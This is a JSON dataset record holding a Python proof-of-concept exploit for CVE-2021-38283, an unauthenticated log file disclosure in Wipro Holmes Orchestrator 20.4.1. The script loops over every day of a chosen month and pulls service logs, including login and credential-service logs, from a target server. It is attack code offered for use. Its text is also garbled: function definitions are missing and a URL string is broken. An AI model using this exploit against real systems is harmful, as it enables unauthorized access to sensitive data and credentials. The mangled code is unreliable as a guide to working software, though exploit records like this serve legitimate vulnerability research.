{
    "text": "vul_name : Wipro Holmes Orchestrator 20.4.1 Unauthenticated Log File Disclosure ， vul_cve : CVE-2021-38283 ， vul_poc :  # Exploit Title : Wipro Holmes Orchestrator 20.4.1 Unauthenticated Log File Disclosure ，  # Date : 09/08/2021 ，  # Exploit Author : Rizal Muhammed @ ub3rsick ，  # Vendor Homepage :  ，  # Version : Wipro Holmes Orchestrator v20.4.1 ，  # Tested on : Windows ，  # CVE : CVE-2021-38283 ， from calendar import monthrange ， from multiprocessing.dummy import Pool as ThreadPool ， from functools import partial ，  # Change if running on different port ， port = 8001 ， log_list = [  ， \"AlertService.txt\" ,  ， \"ApprovalService.txt\" ,  ， \"AuditService.txt\" ,  ， \"CustomerController.txt\" ,  ， \"CustomerDomainCredentialService.txt\" ,  ， \"CustomerFileService.txt\" ,  ， \"CustomerService.txt\" ,  ， \"DashboardController.txt\" ,  ， \"DataParseService.txt\" ,  ， \"DomainService.txt\" ,  ， \"ExecutionService.txt\" ,  ， \"ExternalAPIService.txt\" ,  ， \"FilesController.txt\" ,  ， \"FormService.txt\" ,  ， \"InfrastructureService.txt\" ,  ， \"ITSMConfigPrepService.txt\" ,  ， \"LicenseService.txt\" ,  ， \"LoginService.txt\" ,  ， \"MailService.txt\" ,  ， \"MasterdataController.txt\" ,  ， \"NetworkService.txt\" ,  ， \"OrchestrationPreparationService.txt\" ,  ， \"ProblemInfrastructureService.txt\" ,  ， \"ProcessExecutionService.txt\" ,  ， \"ServiceRequestService.txt\" ,  ， \"SolutionController.txt\" ,  ， \"SolutionLiveService.txt\" ,  ， \"SolutionService.txt\" ,  ， \"StorageService.txt\" ,  ， \"TaskService.txt\" ,  ， \"TicketingService.txt\" ,  ， \"UserController.txt\" ,  ， \"UtilityService.txt\" ，  ]  ， ival = int ( val )  ， raise argparse.ArgumentTypeError ( \"%s is not a valid month\" % val )  ， iyear = int ( val )  ， raise argparse.ArgumentTypeError ( \"%s is not a valid year\" % val )  ， log_url = \" % ( target , date , log_file )  ， log_name = \"%s_%s\" % ( date , log_file )  ， print ( \" [  *  ] Requesting Log : /log/%s/%s\" % ( date , log_file )  ， resp = rq.get ( log_url )  ， print ( \" [ + ] Success : %s\" % log_url )  ，  # print ( resp.text [ 0 : 150 ] + \"\\n<.snipped.>\" )  ， with open ( \"logs/%s\" % log_name , 'w' ) as lf :  ， lf.write ( resp.text )  ， lf.close (  )  ， print ( \" [  *  ] Log File Written to ./logs/%s\" % ( log_name )  ， parser = argparse.ArgumentParser (  ， description=\"Wipro Holmes Orchestrator 20.4.1 Unauthenticated Log File Disclosure\" ,  ， epilog=\"Vulnerability Discovery , PoC Author - Rizal Muhammed @ ub3sick\" ， parser.add_argument ( \"-t\" , \"-target-ip\" , help=\"IP Address of the target server\" , required=True )  ， parser.add_argument ( \"-m\" , \"-month\" , help=\"Month of the log ,  ( 1=JAN , 2=FEB etc. ) \" , required=True , type=check_month )  ， parser.add_argument ( \"-y\" , \"-year\" , help=\"year of the log\" , required=True , type=check_year )  ， args = parser.parse_args (  )  ， ndays = monthrange ( args.year , args.month )  [ 1 ]  ， date_list = [ \"%s\" % datetime.date ( args.year , args.month , day ) for day in range ( 1 , ndays+1 , 1 )  ]  ， target = \"%s : %s\" % ( args.target_ip , port )  ，  # create folder \"logs\" to save log files , if does not exist ， os.makedirs ( \"./logs\" )  ， do_request ( target , log_date , log_file )  ， main (  ) ",
    "time": "2021.11.22"
}